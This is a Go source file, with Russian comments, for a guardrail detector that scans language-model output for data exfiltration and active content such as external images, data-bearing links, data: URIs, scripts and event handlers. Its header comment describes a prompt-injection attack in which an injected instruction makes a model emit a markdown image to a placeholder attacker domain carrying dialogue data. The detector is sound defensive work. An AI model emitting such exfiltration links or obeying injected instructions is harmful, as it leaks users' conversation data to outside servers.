// Пакет exfil — детектор output.exfil: эксфильтрация данных и активное
// содержимое в ответе модели (ТЗ, 5.2; DM-11, DM-12).
//
// Внедрённая инструкция (DM-07) может заставить модель вывести
// markdown-изображение со ссылкой вида https://attacker.example/p.png?d=<данные
// из диалога>: интерфейс приложения загрузит его без участия пользователя,
// и данные уйдут на чужой сервер. Детектор находит в ответе:
//   - изображения (markdown, сноски, HTML-теги, url() в CSS) на домены вне
//     allowlist — с данными в ссылке и без них (DM-11);
//   - ссылки (markdown, HTML, автоссылки, адреса в тексте и аргументах
//     tool_calls) с данными в поддомене, пути, параметрах или userinfo
//     (DM-11); при заданном allowlist — и ссылки на другие домены;
//   - data:-URI в ссылках и атрибутах (DM-11);
//   - активное содержимое: script, iframe, object, embed, form и подобные
//     теги, обработчики событий (onerror=…), ссылки javascript: и vbscript:
//     (DM-12).
//
// Позиции находки охватывают конструкцию целиком (![…](…), тег, адрес), чтобы
// действие «вырезать ссылку» убрало её полностью. Вложенные конструкции
// (значок-изображение внутри ссылки) — одна находка с наибольшей оценкой.
// Внутри кода markdown (``` и `…`) разметка не отображается — оценка не
// выше 0,3.
package exfil

import (
	"context"
	"fmt"
	"sort"
	"strings"

	"github.com/azuresong-afk/ai_railway/internal/detect"
)

// ID и версия детектора.
const (
	ID      = "output.exfil"
	Version = "1.1.0"
)

// Категории находок.
const (
	CatImage   = "exfil.image"
	CatLink    = "exfil.link"
	CatDataURI = "exfil.data_uri"
	CatActive  = "exfil.active"
)

// Пределы конфигурации.
const (
	MaxAllowDomains = 1000
	maxDomain       = 253
)

// Config — параметры детектора.
type Config struct {
	// AllowDomains — домены, на которые разрешены изображения и ссылки:
	// «example.com» — только сам домен, «*.example.com» — его поддомены.
	// Пусто — изображения на внешние домены не разрешены никуда, ссылки
	// проверяются только на данные.
	AllowDomains []string
}

// Detector — детектор output.exfil. Неизменяем после создания, безопасен
// для одновременного вызова.
type Detector struct {
	exact map[string]bool
	wild  map[string]bool
}

// New создаёт детектор без allowlist.
func New() Detector { return Detector{} }

// NewWithConfig создаёт детектор с allowlist доменов.
func NewWithConfig(c Config) (Detector, error) {
	if len(c.AllowDomains) > MaxAllowDomains {
		return Detector{}, fmt.Errorf("output.exfil: доменов в allowlist больше %d", MaxAllowDomains)
	}
	d := Detector{exact: map[string]bool{}, wild: map[string]bool{}}
	for _, raw := range c.AllowDomains {
		dom := strings.ToLower(raw)
		wild := strings.HasPrefix(dom, "*.")
		if wild {
			dom = dom[2:]
		}
		if !validDomain(dom) {
			return Detector{}, fmt.Errorf("output.exfil: домен %q: ожидается имя вида example.com или *.example.com (ASCII, punycode)", raw)
		}
		if wild {
			d.wild[dom] = true
		} else {
			d.exact[dom] = true
		}
	}
	return d, nil
}

// validDomain — имя хоста ASCII: метки из букв, цифр и дефиса, не меньше двух.
func validDomain(d string) bool {
	if d == "" || len(d) > maxDomain {
		return false
	}
	labels := strings.Split(d, ".")
	if len(labels) < 2 {
		return false
	}
	for _, l := range labels {
		if l == "" || len(l) > 63 || l[0] == '-' || l[len(l)-1] == '-' {
			return false
		}
		for i := 0; i < len(l); i++ {
			if (l[i] < 'a' || l[i] > 'z') && !digit(l[i]) && l[i] != '-' {
				return false
			}
		}
	}
	return true
}

// ID — идентификатор детектора.
func (Detector) ID() string { return ID }

// Version — версия детектора.
func (Detector) Version() string { return Version }

// Directions — ответ модели и аргументы tool_calls.
func (Detector) Directions() []detect.Direction { return []detect.Direction{detect.Output} }

// allowed — хост в allowlist. Сравнение точное: хост, который нельзя
// привести к виду из allowlist (Unicode, экранирование), не разрешён.
func (d Detector) allowed(host string) bool {
	if d.exact[host] {
		return true
	}
	for i := 0; i < len(host); i++ {
		if host[i] == '.' && d.wild[host[i+1:]] {
			return true
		}
	}
	return false
}

// kind — как ссылка используется.
type kind int

const (
	kLink  kind = iota // переход по щелчку (или предпросмотр ссылки)
	kImage             // загружается без участия пользователя
)

// verdict — оценка конструкции.
type verdict struct {
	cat, rule string
	score     float64
}

func (v *verdict) max(o verdict) {
	if o.score > v.score {
		*v = o
	}
}

// Оценки.
const (
	scoreScript    = 0.95
	scoreJSURL     = 0.95
	scoreImageData = 0.95
	scoreHandler   = 0.9
	scoreDataAct   = 0.9
	scoreEmbed     = 0.85
	scoreLinkData  = 0.75
	scoreLimit     = 0.7
	scoreImage     = 0.7
	scoreDataURI   = 0.6
	scoreStyle     = 0.6
	scoreLinkOther = 0.55
	scoreInCode    = 0.3
)

// assessURL оценивает адрес; o — откуда он (как его расшифрует получатель).
func (d Detector) assessURL(raw string, k kind, o origin) verdict {
	clean, long := cleanURL(raw, o)
	u := parseURL(clean)
	u.long = long
	switch u.scheme {
	case "javascript", "vbscript", "livescript":
		return verdict{CatActive, "js_url", scoreJSURL}
	case "data":
		mt := strings.ToLower(clean[len("data:"):])
		if j := strings.IndexAny(mt, ";,"); j >= 0 {
			mt = mt[:j]
		}
		mt = strings.TrimSpace(mt)
		if strings.Contains(mt, "html") || strings.Contains(mt, "svg") || strings.Contains(mt, "script") || strings.Contains(mt, "xml") {
			return verdict{CatDataURI, "data_uri_active", scoreDataAct}
		}
		return verdict{CatDataURI, "data_uri", scoreDataURI}
	}
	if !u.external || d.allowed(u.host) {
		return verdict{}
	}
	data := hasData(u, k == kImage)
	switch {
	case k == kImage && data:
		return verdict{CatImage, "image_data", scoreImageData}
	case k == kImage:
		return verdict{CatImage, "image_domain", scoreImage}
	case data:
		return verdict{CatLink, "link_data", scoreLinkData}
	case len(d.exact)+len(d.wild) > 0:
		return verdict{CatLink, "link_domain", scoreLinkOther}
	}
	return verdict{}
}

// Теги активного содержимого.
var embedTags = map[string]bool{
	"iframe": true, "frame": true, "frameset": true, "object": true, "embed": true,
	"applet": true, "portal": true, "base": true, "meta": true, "link": true, "form": true,
}

// Атрибуты, по которым браузер загружает ресурс без участия пользователя.
var loadAttrs = map[string]bool{
	"src": true, "poster": true, "background": true, "data": true, "lowsrc": true, "dynsrc": true,
}

// Атрибуты-ссылки.
var linkAttrs = map[string]bool{
	"href": true, "action": true, "formaction": true, "xlink:href": true, "cite": true, "ping": true,
}

// Теги, у которых href загружается сам (SVG).
var hrefLoads = map[string]bool{"image": true, "use": true, "feimage": true, "img": true}

// assessTag оценивает тег HTML.
func (d Detector) assessTag(name string, attrs []attr) verdict {
	var v verdict
	switch {
	case name == "script":
		v.max(verdict{CatActive, "html_script", scoreScript})
	case embedTags[name]:
		v.max(verdict{CatActive, "html_embed", scoreEmbed})
	case name == "style":
		v.max(verdict{CatActive, "html_style", scoreStyle})
	}
	for _, a := range attrs {
		switch {
		case len(a.name) >= 4 && strings.HasPrefix(a.name, "on") && allLetters(a.name):
			v.max(verdict{CatActive, "html_handler", scoreHandler})
		case !a.hasValue:
		case a.name == "srcset" || a.name == "imagesrcset":
			for _, cand := range strings.Split(a.value, ",") {
				if f := strings.Fields(decodeEntities(cand)); len(f) > 0 {
					v.max(d.assessURL(f[0], kImage, fromText))
				}
			}
		case loadAttrs[a.name] || hrefLoads[name] && (a.name == "href" || a.name == "xlink:href"):
			v.max(d.assessURL(a.value, kImage, fromHTML))
		case linkAttrs[a.name]:
			v.max(d.assessURL(a.value, kLink, fromHTML))
		case a.name == "style":
			v.max(d.assessCSS(decodeEntities(a.value)))
		}
	}
	return v
}

// assessCSS оценивает url(…) в значении style.
func (d Detector) assessCSS(css string) verdict {
	var v verdict
	low := strings.ToLower(css)
	for n := 0; n < 64; n++ {
		i := strings.Index(low, "url(")
		if i < 0 {
			break
		}
		raw, rest := cssURL(css[i+4:])
		v.max(d.assessURL(raw, kImage, fromText))
		css, low = rest, low[len(low)-len(rest):]
	}
	return v
}

// cssURL — адрес внутри url(…) и остаток строки.
func cssURL(s string) (raw, rest string) {
	s = strings.TrimLeft(s, " \t\n")
	if s != "" && (s[0] == '"' || s[0] == '\'') {
		if j := strings.IndexAny(s[1:], string(s[0])+"\n"); j >= 0 {
			return s[1 : 1+j], s[1+j+1:]
		}
		return s[1:], ""
	}
	// Адрес без кавычек: до «)», пробела, скобки или кавычки (CSS).
	if j := strings.IndexAny(s, ") \t\n(\"'"); j >= 0 {
		return s[:j], s[j:]
	}
	return s, ""
}

func allLetters(s string) bool {
	for i := 0; i < len(s); i++ {
		if !letter(s[i]) {
			return false
		}
	}
	return true
}

// bracket — открывающая «[» markdown-ссылки.
type bracket struct {
	pos   int
	image bool // «![»
}

// refDef — определение сноски «[метка]: адрес».
type refDef struct {
	label string
	raw   string
	s, e  int
	code  bool
}

const maxBrackets = 64

// scan — состояние одного прохода.
type scan struct {
	d       Detector
	text    string
	code    [][2]int
	out     []detect.Finding
	stack   []bracket
	imgRefs map[string]bool
	defs    []refDef
	budget  int // работа разбора конструкций сверх одного прохода
	spent   bool
	gt      int // позиция ближайшего «>» не раньше текущей; -1 — нет
	bareEnd int // до этой позиции адреса в тексте не ищутся: они часть оценённого адреса или тега
	stop    int // кэш bareEnd: необрезанный конец и обрезанный для начала stopFrom
	stopEnd int
	stopAt  int
}

// budgetLeft — бюджет разбора не исчерпан. При исчерпании — одна находка
// до конца текста (не выше порога быть не может: текст, рассчитанный на
// исчерпание, не должен проходить молча), дальше разбираются только адреса
// в тексте.
func (s *scan) budgetLeft(i int) bool {
	if s.budget > 0 {
		return true
	}
	if !s.spent {
		s.spent = true
		s.add(verdict{CatLink, "parse_limit", scoreLimit}, i, len(s.text), false)
	}
	return false
}

// tagFits — ближайший «>» не дальше maxTag: иначе тег не разбирается
// (без повторного просмотра текста при каждом «<»).
func (s *scan) tagFits(i int) bool {
	if s.gt != -1 && s.gt <= i {
		k := strings.IndexByte(s.text[i:], '>')
		if k < 0 {
			s.gt = -1
		} else {
			s.gt = i + k
		}
	}
	return s.gt > i && s.gt-i <= maxTag
}

// inCode — позиция внутри кода markdown.
func (s *scan) inCode(p int) bool {
	k := sort.Search(len(s.code), func(k int) bool { return s.code[k][1] > p })
	return k < len(s.code) && s.code[k][0] <= p
}

func (s *scan) add(v verdict, start, end int, code bool) {
	if v.score <= 0 {
		return
	}
	if code && v.score > scoreInCode {
		v.score = scoreInCode
	}
	threat := "DM-11"
	if v.cat == CatActive {
		threat = "DM-12"
	}
	s.out = append(s.out, detect.Finding{Detector: ID, Version: Version, Category: v.cat, Threat: threat, Score: v.score, Start: start, End: end, Rule: v.rule})
}

// Detect находит эксфильтрацию и активное содержимое в ответе.
func (d Detector) Detect(ctx context.Context, t detect.Text) ([]detect.Finding, error) {
	text := t.Text
	code, err := codeSpans(ctx, text)
	if err != nil {
		return nil, err
	}
	s := &scan{d: d, text: text, code: code, imgRefs: map[string]bool{}, budget: 8*len(text) + 4*maxTag, stop: -1}
	for i, n := 0, 0; i < len(text); n++ {
		if n&0x3FFF == 0 {
			if err := ctx.Err(); err != nil {
				return nil, err
			}
		}
		i = s.step(i)
	}
	for _, def := range s.defs {
		k := kLink
		if s.imgRefs[def.label] {
			k = kImage
		}
		s.add(d.assessURL(def.raw, k, fromMD), def.s, def.e, def.code)
	}
	return mergeFindings(s.out), nil
}

// step разбирает конструкцию с позиции i и возвращает позицию продолжения.
// Конструкция не пропускается целиком: разбор продолжается внутри неё
// (markdown в атрибуте тега, изображение внутри адреса), пересекающиеся
// находки сливает mergeFindings.
func (s *scan) step(i int) int {
	text := s.text
	c := text[i]
	switch {
	case c == '\\' && i+1 < len(text) && isPunct(text[i+1]):
		return i + 2
	case c == '[':
		if len(s.stack) == maxBrackets {
			s.stack = append(s.stack[:0], s.stack[1:]...)
		}
		s.stack = append(s.stack, bracket{pos: i, image: i > 0 && text[i-1] == '!' && !escapedAt(text, 0, i-1)})
	case c == ']':
		s.closeBracket(i)
	case c == '<' && s.budgetLeft(i):
		if s.autolink(i) {
			break
		}
		if !s.tagFits(i) {
			break
		}
		if name, attrs, end, ok := htmlTag(text, i, &s.budget); ok {
			s.add(s.d.assessTag(name, attrs), i, end, s.inCode(i))
			s.bareEnd = max(s.bareEnd, end) // адреса атрибутов уже оценены
		}
	case c == ':' && i >= s.bareEnd && jsonSlashes(text[i+1:]):
		j := i
		for j > 0 && i-j < 5 && letter(text[j-1]) {
			j--
		}
		switch strings.ToLower(text[j:i]) {
		case "http", "https", "ftp", "ws", "wss":
			if j == 0 || !alnum(text[j-1]) {
				end := s.bare(j, i)
				s.add(s.d.assessURL(text[j:end], kLink, fromText), j, end, s.inCode(j))
				s.bareEnd = end
			}
		}
	case (c == 'w' || c == 'W') && i >= s.bareEnd && hasPrefixFold(text[i:], "www.") && (i == 0 || !alnum(text[i-1]) && text[i-1] != '.' && text[i-1] != '/' && text[i-1] != '@'):
		end := s.bare(i, i)
		s.add(s.d.assessURL("http://"+text[i:end], kLink, fromText), i, end, s.inCode(i))
		s.bareEnd = end
	case (c == 'u' || c == 'U') && hasPrefixFold(text[i:], "url(") && (i == 0 || !alnum(text[i-1])):
		raw, rest := cssURL(text[i+4 : min(len(text), i+4+maxCSSURL)])
		if strings.ContainsAny(raw, " \t\n") {
			break // адрес в url() без пробелов
		}
		end := min(len(text), i+4+maxCSSURL) - len(rest)
		if end < len(text) && text[end] == ')' {
			end++
		}
		s.add(s.d.assessURL(raw, kImage, fromText), i, end, s.inCode(i))
	}
	return i + 1
}

// jsonSlashes — после «:» идёт «//», «\/\/» или «\u002f\u002f» (JSON).
func jsonSlashes(s string) bool {
	return strings.HasPrefix(s, "//") || strings.HasPrefix(s, `\/\/`) ||
		len(s) >= 12 && strings.EqualFold(s[:12], `\u002f\u002f`)
}

// closeBracket — «]»: встроенная ссылка или изображение, сноска,
// определение сноски.
func (s *scan) closeBracket(i int) {
	text := s.text
	if len(s.stack) == 0 {
		return
	}
	b := s.stack[len(s.stack)-1]
	s.stack = s.stack[:len(s.stack)-1]
	start := b.pos
	if b.image {
		start--
	}
	next := byte(0)
	if i+1 < len(text) {
		next = text[i+1]
	}
	// Если встроенная ссылка или полная сноска не разобрались, CommonMark
	// читает «![метка]» как сокращённую сноску.
	shortcut := func() {
		if b.image && i-b.pos <= maxLabel+1 {
			s.imgRefs[normLabel(text[b.pos+1:i])] = true
		}
	}
	switch {
	case next == '(' && s.budgetLeft(i):
		d, ok := inlineDest(text, i+2, &s.budget)
		if !ok {
			shortcut()
			return
		}
		k := kLink
		if b.image {
			k = kImage
		}
		s.add(s.d.assessURL(d.raw, k, fromMD), start, d.end, s.inCode(start))
		s.bareEnd = max(s.bareEnd, d.end) // адрес уже оценён
	case next == '[':
		limit := min(len(text), i+2+maxLabel)
		j := strings.IndexAny(text[i+2:limit], "[]")
		if j < 0 || text[i+2+j] != ']' {
			shortcut()
			return
		}
		label := text[i+2 : i+2+j]
		if strings.TrimSpace(label) == "" {
			label = text[b.pos+1 : i]
		}
		if b.image {
			s.imgRefs[normLabel(label)] = true
		}
	case next == ':' && !b.image && defStart(text, b.pos) && s.budgetLeft(i):
		q := skipSpace(text, i+2)
		d, end, ok := rawDest(text, q, false, &s.budget)
		if ok && d.raw != "" {
			s.defs = append(s.defs, refDef{label: normLabel(text[b.pos+1 : i]), raw: d.raw, s: b.pos, e: end, code: s.inCode(b.pos)})
			s.bareEnd = max(s.bareEnd, end)
		}
	default:
		shortcut()
	}
}

// autolink — <scheme:адрес> без пробелов.
func (s *scan) autolink(i int) bool {
	text := s.text
	k := schemeEnd(text[i+1 : min(len(text), i+1+40)])
	if k <= 1 {
		return false
	}
	limit := min(len(text), i+1+maxURL)
	j := strings.IndexAny(text[i+1:limit], "> \t\n<")
	if j < 0 {
		s.budget -= limit - i
		return false
	}
	s.budget -= j + 1
	if text[i+1+j] != '>' {
		return false
	}
	end := i + 1 + j + 1
	s.add(s.d.assessURL(text[i+1:i+1+j], kLink, fromMD), i, end, s.inCode(i))
	s.bareEnd = max(s.bareEnd, end)
	return true
}

// bare — конец адреса в тексте, который начинается в from (схема) и найден
// по позиции at. Необрезанный конец кэшируется: адреса подряд без
// разделителя («http://http://…») не просматриваются заново.
func (s *scan) bare(from, at int) int {
	if s.stop < 0 || at >= s.stop || from < s.stopAt {
		s.stop = rawBareEnd(s.text, at)
		s.stopAt = from
		s.stopEnd = trimBare(s.text, from, s.stop)
	}
	if s.stopEnd <= from {
		return max(from, at)
	}
	return s.stopEnd
}

// rawBareEnd — где кончается адрес в тексте: до пробела, «<», «>», «"»
// (конец строки JSON и значения атрибута), «`», «|». Обратная косая черта
// завершает адрес, кроме «\/» и «\uXXXX» из JSON.
func rawBareEnd(text string, from int) int {
	limit := min(len(text), from+maxURL)
	j := from
	for j < limit {
		c := text[j]
		if c <= ' ' || c == '<' || c == '>' || c == '"' || c == '`' || c == '|' {
			break
		}
		if c == '\\' && (j+1 >= len(text) || text[j+1] != '/' && text[j+1] != 'u' && text[j+1] != 'U') {
			break
		}
		j++
	}
	return j
}

// trimBare — знаки препинания, кавычка и несбалансированные скобки в конце
// не часть адреса (как у автоссылок GFM).
func trimBare(text string, from, j int) int {
	open, closed := 0, 0
	for k := from; k < j; k++ {
		switch text[k] {
		case '(':
			open++
		case ')':
			closed++
		}
	}
	for j > from {
		c := text[j-1]
		if strings.IndexByte(".,:;!?*_~'", c) >= 0 {
			j--
			continue
		}
		if c == ')' && open < closed {
			j--
			closed--
			continue
		}
		break
	}
	return j
}

// maxDefPrefix — сколько байт перед «[» просматривается в поисках начала
// строки; префикс длиннее из одних отступов и маркеров — при сомнении
// определение.
const maxDefPrefix = 1024

// defStart — «[» в позиции p может начинать определение сноски: перед ней
// в строке только отступ и маркеры контейнеров — цитаты «>» и пункты списка
// «-», «*», «+», «1.», «1)» с пробелом после. Определение внутри цитаты или
// пункта списка действует на весь документ (CommonMark). Просмотр назад
// идёт только по знакам префикса, а префиксы разных «[» не пересекаются —
// время линейно.
func defStart(text string, p int) bool {
	k := p
	for k > 0 && p-k < maxDefPrefix && strings.IndexByte(" \t>-*+.)0123456789", text[k-1]) >= 0 {
		k--
	}
	if k > 0 && text[k-1] != '\n' {
		return p-k >= maxDefPrefix
	}
	return containerPrefix(text[k:p])
}

// containerPrefix — строка из отступов и маркеров контейнеров.
func containerPrefix(s string) bool {
	for i := 0; i < len(s); {
		c := s[i]
		switch {
		case c == ' ' || c == '\t' || c == '>':
			i++
			continue
		case c == '-' || c == '*' || c == '+':
			i++
		case digit(c):
			j := i
			for j < len(s) && j-i < 9 && digit(s[j]) {
				j++
			}
			if j == len(s) || s[j] != '.' && s[j] != ')' {
				return false
			}
			i = j + 1
		default:
			return false
		}
		// После маркера пункта списка — пробел.
		if i == len(s) || s[i] != ' ' && s[i] != '\t' {
			return false
		}
	}
	return true
}

func normLabel(l string) string {
	return strings.ToLower(strings.Join(strings.Fields(l), " "))
}

func isPunct(c byte) bool {
	return c > ' ' && c < 0x7F && !alnum(c)
}

func hasPrefixFold(s, prefix string) bool {
	return len(s) >= len(prefix) && strings.EqualFold(s[:len(prefix)], prefix)
}

// mergeFindings упорядочивает находки и сливает пересекающиеся в одну с
// наибольшей оценкой: значок-изображение внутри ссылки вырезается вместе
// со ссылкой.
func mergeFindings(fs []detect.Finding) []detect.Finding {
	if len(fs) < 2 {
		return fs
	}
	sort.SliceStable(fs, func(i, j int) bool { return fs[i].Start < fs[j].Start })
	out := fs[:1]
	for _, f := range fs[1:] {
		last := &out[len(out)-1]
		if f.Start >= last.End {
			out = append(out, f)
			continue
		}
		end := max(last.End, f.End)
		if f.Score > last.Score {
			f.Start = last.Start
			*last = f
		}
		last.End = end
	}
	return out
}
